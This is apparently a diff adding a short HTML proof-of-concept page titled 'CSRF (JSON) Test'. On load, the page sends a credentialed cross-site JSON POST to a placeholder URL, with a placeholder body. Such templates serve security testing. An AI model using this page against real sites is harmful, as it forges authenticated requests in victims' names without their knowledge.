@@ -1,0 +1,16 @@
+<html>
+  <body>
+	<h2>CSRF (JSON) Test</h2>
+    <script>
+        function jsonreq() {
+        	var xmlhttp = new XMLHttpRequest();
+        	xmlhttp.withCredentials = true;
+        	xmlhttp.open("POST","https://host/path/to/something", true);
+        	xmlhttp.setRequestHeader("Content-Type","application/json");
+        	xmlhttp.send(JSON.stringify({JSON Data Here}));
+        }
+        jsonreq();
+    </script>
+  </body>
+</html>
+
